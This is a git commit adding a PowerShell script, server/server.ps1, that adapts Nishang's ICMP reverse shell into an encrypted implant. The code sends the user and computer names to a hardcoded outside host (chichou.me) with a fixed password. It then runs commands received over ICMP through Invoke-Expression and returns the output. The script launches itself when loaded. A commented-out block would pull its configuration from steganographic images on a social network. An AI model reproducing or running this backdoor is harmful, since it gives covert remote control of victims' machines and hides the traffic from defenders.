38b65b8501bc096955f03cd8d802afcf2f0e0ba3
周知日 <chichou@ujs.edu.cn>
2016-01-09 15:53:46 +0800

    add server functionality

--- server/server.ps1
+++ server/server.ps1
@@ -1,2 +1,165 @@
-﻿Import-Module ".\Lib"
+﻿Import-Module (Join-Path $PSScriptRoot ".\Lib")
 
+function Invoke-PowerShellIcmp
+{ 
+<#
+.SYNOPSIS
+Nishang script which can be used for a Reverse interactive PowerShell from a target over ICMP. 
+
+.DESCRIPTION
+This script can receive commands from a server, execute them and return the result to the server using only ICMP.
+
+The server to be used with it is icmpsh_m.py from the icmpsh tools (https://github.com/inquisb/icmpsh).
+
+.PARAMETER IPAddress
+The IP address of the server/listener to connect to.
+
+.PARAMETER Delay
+Time in seconds for which the script waits for a command from the server. Default is 5 seconds. 
+
+.PARAMETER BufferSize
+The size of output Buffer. Defualt is 128.
+
+.EXAMPLE
+# sysctl -w net.ipv4.icmp_echo_ignore_all=1
+# python icmpsh_m.py 192.168.254.226 192.168.254.1
+
+Run above commands to start a listener on a Linux computer (tested on Kali Linux).
+icmpsh_m.py is a part of the icmpsh tools.
+
+On the target, run the below command.
+
+PS > Invoke-PowerShellIcmp -IPAddress 192.168.254.226
+
+Above shows an example of an interactive PowerShell reverse connect shell. 
+
+.LINK
+http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-5.html
+https://github.com/samratashok/nishang
+#>           
+    [CmdletBinding()] Param(
+
+        [Parameter(Position = 0, Mandatory = $true)]
+        [String]
+        $IPAddress,
+
+        [Parameter(Position = 1, Mandatory = $true)]
+        [string]
+        $Password,
+
+        [Parameter(Position = 2, Mandatory = $true)]
+        [string]
+        $Uid,
+
+        [Parameter(Position = 1, Mandatory = $false)]
+        [Int]
+        $Delay = 5,
+
+        [Parameter(Position = 2, Mandatory = $false)]
+        [Int]
+        $BufferSize = 128
+
+    )
+    
+    # todo: refactor
+    $checksum = "075231516e85d9c6b60102abb767dbfde920803eb2d79af4462608f8037a1a4e"
+
+    $aes = [Crypto.AES]::New($Password)
+
+    # Basic structure from http://stackoverflow.com/questions/20019053/sending-back-custom-icmp-echo-response
+    $icmp = New-Object System.Net.NetworkInformation.Ping
+    $opt = New-Object System.Net.NetworkInformation.PingOptions
+    $opt.DontFragment = $true
+
+    $timeout = 60 * 1000
+
+    # online
+    $buf = $aes.Encrypt([Text.Encoding]::ASCII.GetBytes("online:" + $uid))
+    $reply = $icmp.Send($IPAddress, $timeout, $buf, $opt)
+    if ($reply.Buffer)
+    {
+        $response = $aes.Decrypt($reply.Buffer)       
+        if ($response -ne $checksum)
+        {
+            # invalid
+            return
+        }
+    }
+
+    # Shell appearance and output redirection based on Powerfun - Written by Ben Turner & Dave Hardy
+    $banner = "Windows PowerShell running as user " + $env:username + " on " + 
+        $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n"
+
+    $buf = $aes.Encrypt([Text.Encoding]::ASCII.GetBytes($banner))
+    $icmp.Send($IPAddress, $timeout, $buf, $opt) | Out-Null
+
+    #Show an interactive PowerShell prompt
+    $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '> ')
+    $sendbytes = $aes.Encrypt($sendbytes)
+    $icmp.Send($IPAddress, $timeout, $sendbytes, $opt) | Out-Null
+
+    while ($true)
+    {
+        $sendbytes = ([text.encoding]::ASCII).GetBytes('')
+        $sendbytes = $aes.Encrypt($sendbytes)
+        $reply = $icmp.Send($IPAddress, $timeout, $sendbytes, $opt)
+        
+        # Check for Command from the server
+        if ($reply.Buffer)
+        {
+            $response = $aes.Decrypt($reply.Buffer)
+            $cmd = [text.encoding]::ASCII.GetString($response)
+            $result = (Invoke-Expression -Command $cmd 2>&1 | Out-String )
+            $sendbytes = [text.encoding]::ASCII.GetBytes($result)
+            $index = [math]::floor($sendbytes.length / $BufferSize)
+            $i = 0
+
+            #Fragmant larger output into smaller ones to send to the server.
+            if ($sendbytes.length -gt $BufferSize)
+            {
+                while ($i -lt $index )
+                {
+                    $sendbytes2 = $sendbytes[($i*$BufferSize)..(($i+1)*$BufferSize)]
+                    $sendbytes2 = $aes.Encrypt($sendbytes2)
+                    $icmp.Send($IPAddress, $timeout, $sendbytes2, $opt) | Out-Null
+                    $i += 1
+                }
+
+                $remainingindex = $sendbytes.Length % $BufferSize
+                
+                if ($remainingindex -ne 0)
+                {
+                    $sendbytes2 = $sendbytes[($i*$BufferSize)..($remainingindex)]
+                    $sendbytes2 = $aes.Encrypt($sendbytes2)
+                    $icmp.Send($IPAddress, $timeout, $sendbytes2, $opt) | Out-Null
+                }
+            }
+            else
+            {
+                $sendbytes = $aes.Encrypt($sendbytes)
+                $icmp.Send($IPAddress, $timeout, $sendbytes, $opt) | Out-Null
+            }
+            $sendbytes = ([text.encoding]::ASCII).GetBytes("`nPS " + (Get-Location).Path + '> ')
+            $sendbytes = $aes.Encrypt($sendbytes)
+            $icmp.Send($IPAddress, $timeout, $sendbytes, $opt) | Out-Null
+        }
+        else
+        {
+            Start-Sleep -Seconds $Delay
+        }
+    }
+}
+
+$uid = "8fd2d4d2-1385-4b66-b4da-00191f6ee044"
+
+# load config from social network
+# $config = Get-Images "thisisaninvisibletag" | % {
+# 	$buf = Read-Steg $_
+# 	$json = [System.Text.ASCIIEncoding]::ASCII.GetString($buf)
+# 	$config = ConvertFrom-Json $json
+# 	Remove-Item $_
+#     $json
+# } | Select-Object -First 1
+
+$config = @{host="chichou.me"; password="P@s5w0rd"; heartbeat=3000}
+Invoke-PowerShellIcmp -IPAddress $config.host -Password $config.password -Uid $uid
